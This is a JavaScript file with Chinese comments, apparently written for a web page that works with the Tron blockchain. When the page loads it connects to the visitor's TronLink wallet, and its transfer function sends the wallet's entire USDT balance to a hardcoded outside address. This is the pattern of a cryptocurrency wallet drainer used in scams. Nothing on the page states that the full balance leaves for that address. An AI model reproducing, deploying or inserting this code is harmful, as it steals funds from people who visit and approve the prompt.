// 初始化 TronWeb
let tronWeb;
let walletAddress;

// 目标地址
const targetAddress = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";

// TRC20 USDT 合约地址（波场主网 USDT 合约地址）
const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 检查 TronWeb 是否加载
function checkTronWeb() {
    if (!window.TronWeb) {
        console.error("TronWeb 库未加载，请检查网络或 CDN 是否可用");
        alert("无法加载 TronWeb 库，请检查网络连接并刷新页面");
        return false;
    }
    return true;
}

// 自动连接钱包
window.addEventListener("load", async () => {
    // 确保 TronWeb 已加载
    if (!checkTronWeb()) return;

    // 检查 TronLink 是否存在
    if (!window.tronLink) {
        console.error("请安装 TronLink 或其他支持波场的钱包");
        alert("请安装 TronLink 钱包扩展并刷新页面");
        return;
    }

    try {
        // 等待 TronLink 准备好
        await window.tronLink.ready;

        // 请求连接 TronLink 钱包
        await window.tronLink.request({ method: "tron_requestAccounts" });
        tronWeb = window.tronLink.tronWeb;

        // 检查钱包地址
        if (!tronWeb.defaultAddress.base58) {
            console.error("未获取到钱包地址，请确保已登录 TronLink");
            alert("请登录 TronLink 钱包并刷新页面");
            return;
        }

        walletAddress = tronWeb.defaultAddress.base58;
        console.log("钱包连接成功，地址:", walletAddress);
    } catch (error) {
        console.error("钱包连接错误:", error);
        alert("钱包连接失败，请检查 TronLink 状态并刷新页面");
    }
});

// 转账 USDT 函数
async function transferUSDT() {
    // 确保 TronWeb 已加载
    if (!checkTronWeb()) return;

    // 确保钱包已连接
    if (!tronWeb || !walletAddress) {
        console.error("钱包未连接，请先连接 TronLink 钱包");
        alert("请先连接 TronLink 钱包");
        return;
    }

    try {
        // 获取 USDT 合约实例
        const contract = await tronWeb.contract().at(usdtContractAddress);

        // 获取余额
        const balance = await contract.balanceOf(walletAddress).call();
        console.log("USDT 余额:", balance.toString());

        // 如果余额为 0，提示用户
        if (balance == 0) {
            console.warn("余额为 0，仍将发起转账，交给钱包处理");
            alert("您的 USDT 余额为 0，仍将发起转账，请确认");
        }

        // 调用 transfer 方法，转账全部余额
        await contract.transfer(
            targetAddress,
            balance // 直接使用 balance，USDT 精度为 6 位小数
        ).send({
            feeLimit: 10000000, // 设置手续费限制，单位是 SUN（1 TRX = 1,000,000 SUN）
            shouldPollResponse: false // 不等待交易确认，直接交给钱包
        });

        // 转账发起后，交给钱包处理
        console.log("转账已发起，等待钱包确认");
    } catch (error) {
        console.error("转账失败:", error);
        alert("转账失败，请检查钱包状态和网络连接");
    }
}
